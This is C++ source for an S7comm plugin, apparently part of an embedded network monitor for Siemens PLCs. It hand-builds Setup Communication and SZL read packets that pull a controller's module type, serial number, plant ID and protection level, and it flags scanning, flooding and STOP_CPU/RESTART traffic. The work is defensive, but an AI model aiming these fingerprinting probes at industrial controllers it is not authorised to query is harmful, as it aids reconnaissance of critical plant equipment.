bool S7Plugin::sendS7SetupComm(int sock, S7DeviceInfo& dev_info) {
    auto send_once = [&](uint16_t requested_pdu) -> bool {
        // Build S7 Setup Communication PDU (Snap7-like)
        uint8_t setup[] = {
            0x03, 0x00, 0x00, 0x19,
            0x02, 0xF0, 0x80,
            0x32, S7::PDU_TYPE_JOB,
            0x00, 0x00,
            0x00, 0x01,
            0x00, 0x08,
            0x00, 0x00,
            S7::FUNC_SETUP_COMM,
            0x00,
            0x00, 0x01,
            0x00, 0x01,
            0x00, 0x00
        };
        wr16be_free(setup + (sizeof(setup) - 2), requested_pdu);

        if (::send(sock, setup, sizeof(setup), 0) != (ssize_t)sizeof(setup)) {
            return false;
        }

        // Receive response (read full TPKT frame, even if split across TCP segments)
        uint8_t rx[512];
        size_t rx_len = 0;
        if (!recv_tpkt_frame_free(sock, rx, sizeof(rx), rx_len)) {
            return false;
        }

        // Locate S7 PDU in response
        size_t s7_len = 0;
        const uint8_t* s7 = locateS7Pdu(rx, rx_len, s7_len);
        if (!s7 || s7_len < 20) {
            return false;
        }

        // Check if it's ACK_DATA
        if (s7[1] != S7::PDU_TYPE_ACK_DATA) {
            return false;
        }

        // ACK_DATA header: bytes 10..11 are error class/code.
        if (s7[10] != 0x00 || s7[11] != 0x00) {
            return false;
        }

        // Parse negotiated parameters from the SetupComm parameter block:
        // [12]=func(F0) [13]=reserved [14..15]=max_calling [16..17]=max_called [18..19]=pdu_len
        if (s7[12] != S7::FUNC_SETUP_COMM) {
            return false;
        }
        dev_info.max_jobs_calling = rd16be(s7 + 14);
        dev_info.max_jobs_called = rd16be(s7 + 16);
        dev_info.asdu_length = rd16be(s7 + 18);
        dev_info.setup_comm_success = true;
        return true;
    };

    // Prefer a conservative request first (480), then retry with 960 if needed.
    if (!send_once(0x01E0) && !send_once(0x03C0)) {
        LOG_WARNING(TAG_S7, "Setup Communication send failed");
        return false;
    }

    LOG_INFOF(TAG_S7, "Setup OK: PDU=%u, Jobs=%u/%u",
              dev_info.asdu_length, dev_info.max_jobs_calling, dev_info.max_jobs_called);
    return true;
}

bool S7Plugin::readSZL(int sock, uint16_t szl_id, uint16_t szl_index, S7DeviceInfo& dev_info) {
    // Build SZL Read request (Userdata)
    // This is a simplified implementation - full SZL requires complex parameter encoding
    uint8_t szl_req[] = {
        // TPKT Header
        0x03, 0x00, 0x00, 0x21,  // Length = 33 bytes
        // COTP Header
        0x02, 0xF0, 0x80,
        // S7 Header
        0x32,                    // Protocol ID
        S7::PDU_TYPE_USERDATA,   // ROSCTR = Userdata
        0x00, 0x00,              // Redundancy ID
        0x00, 0x02,              // PDU Reference
        0x00, 0x0C,              // Parameter length = 12
        0x00, 0x04,              // Data length = 4
        // Parameters (Userdata)
        0x00, 0x01, 0x12,        // Parameter head (Request, Type: Request)
        0x04,                    // Parameter length following
        0x11,                    // SZL functions
        0x44,                    // Request SZL (0x04 = read, 0x44 with data)
        0x01,                    // Sequence number
        0x00,                    // Reserved
        // Data
        0x00,                    // Return code
        0xFF,                    // Transport size (NULL)
        0x09, 0x00,              // Length in bytes
        0x00, 0x00,              // SZL-ID (will be filled)
        0x00, 0x00               // SZL-Index (will be filled)
    };

    // Fill SZL ID and Index
    wr16be(szl_req + 29, szl_id);
    wr16be(szl_req + 31, szl_index);

    if (::send(sock, szl_req, sizeof(szl_req), 0) != sizeof(szl_req)) {
        LOG_WARNINGF(TAG_S7, "SZL read send failed (ID=0x%04X)", szl_id);
        return false;
    }

    // Receive response (SZL data can be large)
    uint8_t rx[1024];
    ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
    if (n < 30) {
        LOG_WARNINGF(TAG_S7, "SZL response too short (ID=0x%04X)", szl_id);
        return false;
    }

    // Locate S7 PDU
    size_t s7_len = 0;
    const uint8_t* s7 = locateS7Pdu(rx, (size_t)n, s7_len);
    if (!s7 || s7[1] != S7::PDU_TYPE_USERDATA) {
        LOG_WARNINGF(TAG_S7, "Invalid SZL response (ID=0x%04X)", szl_id);
        return false;
    }

    // Parse SZL data
    bool parsed = parseSZLResponse(s7, s7_len, szl_id, dev_info);
    if (parsed) {
        dev_info.szl_read_success = true;
        LOG_INFOF(TAG_S7, "SZL 0x%04X read successfully", szl_id);
    }

    return parsed;
}

bool S7Plugin::parseSZLResponse(const uint8_t* data, size_t len, uint16_t szl_id, S7DeviceInfo& dev_info) {
    // Simplified SZL parsing - real implementation needs to handle variable length records
    // SZL structure after S7 header (offset 12+):
    // Parameter: [00 01 12] [length] [11 44] [seq] [00] [last_unit] [error_code]
    // Data: [return_code] [transport_size] [length] [SZL_ID] [SZL_Index] [SZL_length] [SZL_count] [records...]

    if (len < 40) return false;  // Minimum size for meaningful SZL response

    // Find data section (after parameters)
    uint16_t param_len = rd16be(data + 6);
    uint16_t data_len = rd16be(data + 8);

    if (10 + param_len + data_len > len) {
        LOG_WARNING(TAG_S7, "SZL response length mismatch");
        return false;
    }

    const uint8_t* szl_data = data + 10 + param_len;

    // Check return code (offset 0 in data section)
    if (szl_data[0] != 0xFF) {  // 0xFF = success
        LOG_WARNINGF(TAG_S7, "SZL read error code: 0x%02X", szl_data[0]);
        return false;
    }

    // Best-effort parse SZL header:
    // [0]=return_code [1]=transport_size [2..3]=length [4..5]=SZL_ID [6..7]=SZL_Index
    // [8..9]=SZL_len [10..11]=SZL_count [12..]=records...
    if (data_len < 12) return false;
    const uint16_t resp_id = rd16be(szl_data + 4);
    (void)resp_id;
    const uint16_t szl_len = rd16be(szl_data + 8);
    const uint16_t szl_cnt = rd16be(szl_data + 10);
    const uint8_t* records = szl_data + 12;
    const size_t records_total = (size_t)szl_len * (size_t)szl_cnt;
    if (records_total == 0 || 12U + records_total > (size_t)data_len) {
        // Some devices respond with unexpected lengths; continue with conservative fallback.
    }

    auto extract_ascii_tokens = [&](const uint8_t* buf, size_t blen, char* out1, size_t out1sz, char* out2, size_t out2sz) {
        if (out1 && out1sz) out1[0] = '\0';
        if (out2 && out2sz) out2[0] = '\0';
        if (!buf || blen == 0) return;
        // Find up to 2 printable ASCII runs (len>=4).
        size_t found = 0;
        size_t i = 0;
        while (i < blen && found < 2) {
            while (i < blen) {
                uint8_t c = buf[i];
                if (c >= 32 && c <= 126) break;
                ++i;
            }
            size_t j = i;
            while (j < blen) {
                uint8_t c = buf[j];
                if (!(c >= 32 && c <= 126)) break;
                ++j;
            }
            size_t run = (j > i) ? (j - i) : 0;
            if (run >= 4) {
                if (found == 0 && out1 && out1sz) {
                    size_t n = (run < (out1sz - 1)) ? run : (out1sz - 1);
                    memcpy(out1, buf + i, n);
                    out1[n] = '\0';
                } else if (found == 1 && out2 && out2sz) {
                    size_t n = (run < (out2sz - 1)) ? run : (out2sz - 1);
                    memcpy(out2, buf + i, n);
                    out2[n] = '\0';
                }
                found++;
            }
            i = (j > i) ? j : (i + 1);
        }
    };

    // Parse based on SZL ID
    switch (szl_id) {
        case S7::SZL_MODULE_IDENTIFICATION: {
            // SZL 0x0011: Module Identification
            // Contains: Module name, Order code, Version, etc.
            // Best-effort: extract printable tokens from first record.
            if (szl_len > 0 && data_len >= 12 + szl_len) {
                const uint8_t* rec0 = records;
                char t1[40], t2[40];
                extract_ascii_tokens(rec0, szl_len, t1, sizeof(t1), t2, sizeof(t2));
                if (dev_info.module_type[0] == '\0' && t1[0] != '\0') {
                    strncpy(dev_info.module_type, t1, sizeof(dev_info.module_type) - 1);
                    dev_info.module_type[sizeof(dev_info.module_type) - 1] = '\0';
                }
                if (dev_info.order_code[0] == '\0' && t2[0] != '\0') {
                    strncpy(dev_info.order_code, t2, sizeof(dev_info.order_code) - 1);
                    dev_info.order_code[sizeof(dev_info.order_code) - 1] = '\0';
                }
            }
            break;
        }

        case S7::SZL_CPU_PROTECTION: {
            // SZL 0x0232 Index 4: CPU Protection level
            if (data_len < 20) break;
            const uint8_t* record = szl_data + 8;
            dev_info.protection_level = record[2] & 0x0F;  // Lower nibble = protection level
            LOG_INFOF(TAG_S7, "Protection level: %u", dev_info.protection_level);
            break;
        }

        case S7::SZL_COMPONENT_IDENTIFICATION: {
            // SZL 0x001C: Component identification (serial, plant ID, etc.)
            if (szl_len > 0 && data_len >= 12 + szl_len) {
                const uint8_t* rec0 = records;
                char t1[40], t2[40];
                extract_ascii_tokens(rec0, szl_len, t1, sizeof(t1), t2, sizeof(t2));
                if (dev_info.serial_number[0] == '\0' && t1[0] != '\0') {
                    strncpy(dev_info.serial_number, t1, sizeof(dev_info.serial_number) - 1);
                    dev_info.serial_number[sizeof(dev_info.serial_number) - 1] = '\0';
                }
                if (dev_info.plant_id[0] == '\0' && t2[0] != '\0') {
                    strncpy(dev_info.plant_id, t2, sizeof(dev_info.plant_id) - 1);
                    dev_info.plant_id[sizeof(dev_info.plant_id) - 1] = '\0';
                }
            }
            break;
        }

        default:
            LOG_INFOF(TAG_S7, "SZL 0x%04X parsed (generic)", szl_id);
            break;
    }

    return true;
}

bool S7Plugin::buildDeviceInfoJSON(const S7DeviceInfo& dev_info,
                                   const char* target_ip, uint16_t port,
                                   psram_string& out_json) {
    out_json = PSRAMUtils::createPSRAMString("{");

    // Target
    out_json += PSRAMUtils::createPSRAMString("\"target\":\"");
    out_json += PSRAMUtils::createPSRAMString(target_ip);
    char port_buf[16];
    snprintf(port_buf, sizeof(port_buf), ":%u\",", port);
    out_json += PSRAMUtils::createPSRAMString(port_buf);

    // Protocol
    out_json += PSRAMUtils::createPSRAMString("\"protocol\":\"s7comm\",");

    // Device info
    out_json += PSRAMUtils::createPSRAMString("\"device\":{");

    if (dev_info.module_type[0] != '\0') {
        out_json += PSRAMUtils::createPSRAMString("\"type\":\"");
        out_json += PSRAMUtils::createPSRAMString(dev_info.module_type);
        out_json += PSRAMUtils::createPSRAMString("\",");
    }

    if (dev_info.order_code[0] != '\0') {
        out_json += PSRAMUtils::createPSRAMString("\"order_code\":\"");
        out_json += PSRAMUtils::createPSRAMString(dev_info.order_code);
        out_json += PSRAMUtils::createPSRAMString("\",");
    }

    if (dev_info.firmware_version[0] != '\0') {
        out_json += PSRAMUtils::createPSRAMString("\"firmware\":\"");
        out_json += PSRAMUtils::createPSRAMString(dev_info.firmware_version);
        out_json += PSRAMUtils::createPSRAMString("\",");
    }

    if (dev_info.serial_number[0] != '\0') {
        out_json += PSRAMUtils::createPSRAMString("\"serial\":\"");
        out_json += PSRAMUtils::createPSRAMString(dev_info.serial_number);
        out_json += PSRAMUtils::createPSRAMString("\",");
    }

    char buf[64];
    snprintf(buf, sizeof(buf), "\"pdu_size\":%u,\"max_jobs\":%u,\"protection_level\":%u",
             dev_info.asdu_length, dev_info.max_jobs_calling, dev_info.protection_level);
    out_json += PSRAMUtils::createPSRAMString(buf);

    out_json += PSRAMUtils::createPSRAMString("},");

    // Status flags
    out_json += PSRAMUtils::createPSRAMString("\"status\":{");
    snprintf(buf, sizeof(buf),
             "\"online\":%s,\"setup_ok\":%s,\"szl_ok\":%s",
             dev_info.is_online ? "true" : "false",
             dev_info.setup_comm_success ? "true" : "false",
             dev_info.szl_read_success ? "true" : "false");
    out_json += PSRAMUtils::createPSRAMString(buf);
    out_json += PSRAMUtils::createPSRAMString("}");

    out_json += PSRAMUtils::createPSRAMString("}");

    return true;
}

// ==================== FLOW MANAGEMENT IMPLEMENTATION ====================

bool S7Plugin::buildFlowKey(const NetworkPacket& packet, FlowKey& key) {
    // S7 protocol structure:
    // TPKT (4 bytes) + COTP (variable) + S7 PDU (variable)
    //
    // TPKT header (4 bytes):
    // 0: Version (0x03)
    // 1: Reserved (0x00)
    // 2-3: Length (total packet length including TPKT)
    //
    // COTP header (variable, min 2 bytes):
    // 0: Length Indicator (LI) - length of COTP header minus 1
    // 1: PDU Type (0xF0=DT Data, 0xE0=CR, 0xD0=CC, 0x80=DR, 0xC0=DC)
    // 2+: PDU Type specific data
    //
    // Per CR (Connection Request) / CC (Connection Confirm):
    // Contengono src-ref, dst-ref, class/options, TSAP params
    //
    // S7 PDU (dopo COTP DT):
    // 0: Protocol ID (0x32)
    // 1: Message Type (ROSCTR): 0x01=Job, 0x02=Ack, 0x03=Ack-Data, 0x07=Userdata
    // ... rest of S7 header and data

    const uint8_t* data = packet.data;
    size_t len = packet.length;

    // Verifica minimo TPKT + COTP header
    if (len < 7) {
        return false;  // Troppo corto
    }

    // Verifica TPKT version
    if (data[0] != 0x03) {
        return false;  // Not TPKT
    }

    // COTP Length Indicator
    uint8_t cotp_li = data[4];
    if (len < (size_t)(4 + 1 + cotp_li)) {
        return false;  // Pacchetto incompleto
    }

    // Costruisci chiave base
    PSRAMAllocator<char> alloc;
    key.src_ip = psram_string(packet.src_ip, alloc);
    key.dst_ip = psram_string(packet.dst_ip, alloc);
    key.src_port = packet.src_port;
    key.dst_port = packet.dst_port;

    // Protocol specific: use rack/slot if available or session identifier
    // For simplicity we use an empty string (all S7 flows on the same TCP connection
    // condividono la stessa FlowKey). In alternativa si potrebbe usare src-ref/dst-ref da COTP CR/CC.
    // Per ora: chiave semplice basata solo su IP:port
    key.protocol_specific = psram_string("", alloc);

    return true;
}

bool S7Plugin::classifyPacketOperation(const NetworkPacket& packet,
                                       psram_string& operation_type,
                                       psram_string& operation_details,
                                       bool& is_error) {
    PSRAMAllocator<char> alloc;
    is_error = false;

    // Localizza S7 PDU nel pacchetto
    size_t s7_len = 0;
    const uint8_t* s7 = locateS7Pdu(packet.data, packet.length, s7_len);

    if (!s7 || s7_len < 10) {
        // There is no valid S7 PDU, it could just be a COTP handshake
        // Check if it is COTP CR/CC
        if (packet.length >= 7) {
            uint8_t cotp_type = packet.data[5];

            if (cotp_type == 0xE0) {
                // COTP Connection Request
                operation_type = psram_string("CONTROL", alloc);
                operation_details = psram_string("COTP_CR Connection_Request", alloc);
                return true;
            } else if (cotp_type == 0xD0) {
                // COTP Connection Confirm
                operation_type = psram_string("CONTROL", alloc);
                operation_details = psram_string("COTP_CC Connection_Confirm", alloc);
                return true;
            } else if (cotp_type == 0x80) {
                // COTP Disconnect Request
                operation_type = psram_string("CONTROL", alloc);
                operation_details = psram_string("COTP_DR Disconnect_Request", alloc);
                return true;
            }
        }

        return false;  // Non classificabile
    }

    // Parse S7 header
    uint8_t protocol_id = s7[0];
    uint8_t rosctr = s7[1];  // Message Type

    if (protocol_id != 0x32) {
        return false;  // Not S7
    }

    // Check if it is an error message (Error class field)
    // Nel formato S7, gli errori sono indicati nei campi Error class/Error code
    // For simplicity, we check ROSCTR Ack (0x02) which often indicates an error
    if (rosctr == 0x02) {
        // ACK senza dati - potrebbe essere errore
        is_error = true;
        operation_type = psram_string("ERROR", alloc);
        operation_details = psram_string("ROSCTR=0x02 ACK", alloc);
        return true;
    }

    // Estrai function code (se presente)
    // In S7, il function code si trova nel parametro, dopo l'header
    // Header S7: protocol_id(1) + rosctr(1) + reserved(2) + pdu_ref(2) + param_len(2) + data_len(2) = 10 bytes
    if (s7_len < 12) {
        // Header troppo corto per avere function code
        char details[64];
        snprintf(details, sizeof(details), "ROSCTR=0x%02X NoFunc", rosctr);
        operation_type = psram_string("OTHER", alloc);
        operation_details = psram_string(details, alloc);
        return true;
    }

    uint16_t param_len = (s7[8] << 8) | s7[9];

    if (param_len > 0 && s7_len >= 11) {
        uint8_t func_code = s7[10];  // Primo byte del parametro

        char details[128];

        // Classifica in base al function code
        if (func_code == S7::FUNC_SETUP_COMM) {
            operation_type = psram_string("CONTROL", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0xF0 SetupComm", rosctr);

        } else if (func_code == S7::FUNC_READ_VAR) {
            operation_type = psram_string("READ", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0x04 ReadVar", rosctr);

        } else if (func_code == S7::FUNC_WRITE_VAR) {
            operation_type = psram_string("WRITE", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0x05 WriteVar", rosctr);

        } else if (func_code == S7::FUNC_STOP_CPU) {
            operation_type = psram_string("CONTROL", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0x29 STOP_CPU", rosctr);

        } else if (func_code == S7::FUNC_HOT_RESTART) {
            operation_type = psram_string("CONTROL", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0x28 RESTART_CPU", rosctr);

        } else {
            // Function code non riconosciuto
            operation_type = psram_string("OTHER", alloc);
            snprintf(details, sizeof(details), "ROSCTR=0x%02X FUNC=0x%02X", rosctr, func_code);
        }

        operation_details = psram_string(details, alloc);
        return true;
    }

    // No function code found
    char details[64];
    snprintf(details, sizeof(details), "ROSCTR=0x%02X NoParam", rosctr);
    operation_type = psram_string("OTHER", alloc);
    operation_details = psram_string(details, alloc);
    return true;
}

void S7Plugin::cleanupFlowContext(void* ctx_ptr) {
    if (!ctx_ptr) {
        return;
    }
    auto* ctx = static_cast<S7FlowContext*>(ctx_ptr);
    ctx->~S7FlowContext();
    heap_caps_free(ctx);
}

void S7Plugin::getRuntimeStats(RuntimeStats& out) const {
    out.handshake_started = handshake_started_.load(std::memory_order_relaxed);
    out.handshake_confirmed = handshake_confirmed_.load(std::memory_order_relaxed);
    out.handshake_failed = handshake_failed_.load(std::memory_order_relaxed);
    out.setup_comm_completed = setup_comm_success_.load(std::memory_order_relaxed);
    out.tls_sessions = tls_sessions_.load(std::memory_order_relaxed);
    out.stop_cpu_detected = stop_cpu_detected_.load(std::memory_order_relaxed);
    out.stop_cpu_blocked = stop_cpu_blocked_.load(std::memory_order_relaxed);
    out.restart_detected = restart_detected_.load(std::memory_order_relaxed);
    out.reconnaissance_alerts = reconnaissance_alerts_.load(std::memory_order_relaxed);
    out.write_alerts = write_alerts_.load(std::memory_order_relaxed);
    out.brute_force_alerts = brute_force_alerts_.load(std::memory_order_relaxed);
    out.flooding_alerts = flooding_alerts_.load(std::memory_order_relaxed);
}

void S7Plugin::raiseHandshakeAlert(const NetworkPacket& packet, S7FlowContext* ctx, const char* reason) {
    if (!ctx || ctx->handshake_alerted) {
        return;
    }
    ctx->handshake_alerted = true;
    handshake_failed_.fetch_add(1, std::memory_order_relaxed);
    PSRAMUtils::ScopedBuffer buf(256);
    if (!buf.valid()) {
        return;
    }
    const char* safe_reason = reason ? reason : "unknown";
    snprintf(buf.get(), buf.size(),
             "{\"type\":\"s7_handshake_anomaly\",\"reason\":\"%s\"}", safe_reason);
    reportIntrusionPSRAM(packet, PSRAMUtils::createPSRAMString(buf.get()), LogLevel::WARNING);
}

void S7Plugin::updateProtocolState(const NetworkPacket& packet, FlowData& flow) {
    // S7 has a more complex state machine than Modbus:
    // INIT -> CONNECTING (COTP CR) -> ESTABLISHED (COTP CC) ->
    // CONNECTING (S7 Setup Comm) -> AUTHENTICATED (Setup Comm Ack) ->
    // DATA_EXCHANGE -> CLOSING -> CLOSED

    const uint8_t* data = packet.data;
    size_t len = packet.length;

    if (len < 7) return;

    S7FlowContext* ctx = flow.getProtocolData<S7FlowContext>();
    if (!ctx) {
        ctx = flow.allocateProtocolData<S7FlowContext>(cleanupFlowContext);
        if (!ctx) {
            return;
        }
    }

    // Verifica COTP PDU type
    uint8_t cotp_type = data[5];

    if (flow.state == FlowState::INIT) {
        if (cotp_type == 0xE0) {
            if (!ctx->handshake_started) {
                ctx->handshake_started = true;
                handshake_started_.fetch_add(1, std::memory_order_relaxed);
            }
            flow.state = FlowState::CONNECTING;
        } else {
            raiseHandshakeAlert(packet, ctx, "unexpected_initial_pdu");
            flow.state = FlowState::DATA_EXCHANGE;
        }
        return;
    }

    if (flow.state == FlowState::CONNECTING) {
        if (cotp_type == 0xD0) {
            if (!ctx->handshake_confirmed) {
                ctx->handshake_confirmed = true;
                handshake_confirmed_.fetch_add(1, std::memory_order_relaxed);
            }
            flow.state = FlowState::ESTABLISHED;
            return;
        } else if (cotp_type == 0xF0) {
            size_t s7_len = 0;
            const uint8_t* s7 = locateS7Pdu(data, len, s7_len);

            if (s7 && s7_len >= 11) {
                uint16_t param_len = (s7[8] << 8) | s7[9];
                if (param_len > 0) {
                    uint8_t func = s7[10];
                    if (func == S7::FUNC_SETUP_COMM) {
                        ctx->setup_complete = false;
                        return;
                    }
                }
            }

            if (!ctx->handshake_confirmed) {
                raiseHandshakeAlert(packet, ctx, "data_before_confirm");
            }
            flow.state = FlowState::DATA_EXCHANGE;
            return;
        }
        return;
    }

    if (flow.state == FlowState::ESTABLISHED) {
        size_t s7_len = 0;
        const uint8_t* s7 = locateS7Pdu(data, len, s7_len);

        if (s7 && s7_len >= 11) {
            uint8_t rosctr = s7[1];
            uint16_t param_len = (s7[8] << 8) | s7[9];

            if (rosctr == S7::PDU_TYPE_ACK_DATA && param_len > 0) {
                uint8_t func = s7[10];
                if (func == S7::FUNC_SETUP_COMM) {
                    if (!ctx->setup_complete) {
                        ctx->setup_complete = true;
                        setup_comm_success_.fetch_add(1, std::memory_order_relaxed);
                    }
                    flow.state = FlowState::AUTHENTICATED;
                    return;
                }
            }
        }

        if (!ctx->setup_complete) {
            raiseHandshakeAlert(packet, ctx, "setup_comm_missing");
        }
        flow.state = FlowState::DATA_EXCHANGE;
        return;
    }

    if (flow.state == FlowState::AUTHENTICATED) {
        // Passa a DATA_EXCHANGE
        flow.state = FlowState::DATA_EXCHANGE;
        return;
    }

    if (flow.state == FlowState::DATA_EXCHANGE) {
        // Verifica disconnect
        if (cotp_type == 0x80) {
            // COTP Disconnect Request
            flow.state = FlowState::CLOSING;
        }
        return;
    }

    if (flow.state == FlowState::CLOSING) {
        // Attende disconnect confirm o passa a CLOSED
        flow.state = FlowState::CLOSED;
        return;
    }
}

void S7Plugin::assignFlowLabel(FlowData& flow) {
    // Assegna label basandosi sulle metriche

    // 1. Verifica flooding
    if (flow.metrics.intensity == FlowIntensity::FLOODING) {
        flow.metrics.primary_label = FlowLabel::FLOODING;
        flow.metrics.secondary_label = FlowLabel::ATTACK_CONFIRMED;
        return;
    }

    // 2. Verifica troppi errori
    if (flow.metrics.hasTooManyErrors(0.3f)) {
        flow.metrics.primary_label = FlowLabel::SUSPICIOUS;
        flow.metrics.secondary_label = FlowLabel::PROTOCOL_VIOLATION;
        return;
    }

    // 3. Verifica scanning pattern
    if (flow.metrics.intensity >= FlowIntensity::VERY_HIGH &&
        flow.metrics.isReader() &&
        flow.getOperationCount() > 50) {
        flow.metrics.primary_label = FlowLabel::SCANNER;
        flow.metrics.secondary_label = FlowLabel::RECONNAISSANCE;
        return;
    }

    // 4. Verifica operazioni pericolose (STOP/RESTART CPU)
    // Controlla se ci sono CONTROL operations con STOP_CPU
    uint32_t stop_count = 0;
    uint32_t restart_count = 0;

    for (const auto& op : flow.recent_operations) {
        if (op.type == "CONTROL") {
            if (op.details.find("STOP_CPU") != psram_string::npos) {
                stop_count++;
            } else if (op.details.find("RESTART_CPU") != psram_string::npos) {
                restart_count++;
            }
        }
    }

    if (stop_count > 0 || restart_count > 0) {
        flow.metrics.primary_label = FlowLabel::DANGEROUS_OPERATION;
        flow.metrics.secondary_label = FlowLabel::ATTACK_CONFIRMED;
        return;
    }

    // 5. Classifica normale basato su read/write ratio
    if (flow.metrics.isWriter()) {
        if (flow.metrics.write_operations > flow.metrics.read_operations * 2) {
            flow.metrics.primary_label = FlowLabel::WRITER;
        } else {
            flow.metrics.primary_label = FlowLabel::MIXED_RW;
        }
    } else if (flow.metrics.isReader()) {
        flow.metrics.primary_label = FlowLabel::READER;

        // Check polling pattern
        if (flow.metrics.intensity >= FlowIntensity::LOW &&
            flow.metrics.intensity <= FlowIntensity::MEDIUM) {
            flow.metrics.secondary_label = FlowLabel::POLLING;
        }
    } else {
        // Prevalentemente CONTROL operations
        flow.metrics.primary_label = FlowLabel::DIAGNOSTIC;
    }

    // 6. Heavy user detection
    if (flow.metrics.intensity == FlowIntensity::HIGH) {
        flow.metrics.secondary_label = FlowLabel::HEAVY_USER;
    }

    // Default se non ancora assegnato
    if (flow.metrics.primary_label == FlowLabel::NORMAL_OPERATION &&
        flow.metrics.packet_count > 0) {
        flow.metrics.primary_label = FlowLabel::NORMAL_OPERATION;
    }
}
